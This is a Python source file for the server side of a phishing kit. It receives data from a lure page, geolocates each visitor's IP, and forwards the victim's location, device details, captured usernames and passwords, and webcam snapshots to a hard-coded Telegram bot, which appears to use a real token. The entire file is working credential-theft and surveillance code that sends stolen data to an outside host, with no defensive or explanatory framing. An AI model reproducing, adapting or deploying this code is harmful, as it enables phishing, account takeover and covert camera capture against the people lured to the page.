import os
import json
import base64
import urllib.request
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

BOT_TOKEN = "8548399195:AAEQ9mPh2NnsRMvY6Oimpfs0U_st82QBrlg"
CHAT_ID = "7565157342"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req)
    except Exception as e:
        print("Telegram Msg Error:", e)

def send_photo_to_telegram(base64_img):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        img_data = base64_img.split(',')[1]
        binary_img = base64.b64decode(img_data)
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        body = b''
        body += f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'.encode('utf-8')
        body += f'--{boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cam.jpg"\r\nContent-Type: image/jpeg\r\n\r\n'.encode('utf-8')
        body += binary_img + b'\r\n'
        body += f'--{boundary}--\r\n'.encode('utf-8')
        req = urllib.request.Request(url, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        urllib.request.urlopen(req)
    except Exception as e:
        print("Photo Error:", e)

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

        if self.path == '/log_visit':
            ip = self.client_address[0]
            if 'X-Forwarded-For' in self.headers:
                ip = self.headers['X-Forwarded-For'].split(',')[0]
            try:
                req = urllib.request.urlopen(f"http://ip-api.com/json/{ip}")
                geo = json.loads(req.read().decode())
                location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')} (ISP: {geo.get('isp', 'Unknown')})"
            except:
                location = "Unknown"
            msg = f"👀 <b>NEW TARGET OPENED LINK</b>\n\n🌐 <b>IP:</b> <code>{ip}</code>\n📍 <b>Location:</b> {location}\n📱 <b>Device:</b> {data.get('platform')}\n🔍 <b>User-Agent:</b> {data.get('userAgent')}\n"
            send_to_telegram(msg)
        elif self.path == '/log_creds':
            msg = f"🔐 <b>CREDENTIALS CAPTURED!</b>\n\n👤 <b>Username/Email:</b> <code>{data.get('username')}</code>\n🔑 <b>Password:</b> <code>{data.get('password')}</code>\n"
            send_to_telegram(msg)
        elif self.path == '/log_camera':
            msg = f"📸 <b>CAMERA SNAPSHOT CAPTURED!</b>\n"
            send_to_telegram(msg)
            send_photo_to_telegram(data.get('image'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server = HTTPServer(('0.0.0.0', port), Handler)
    server.serve_forever()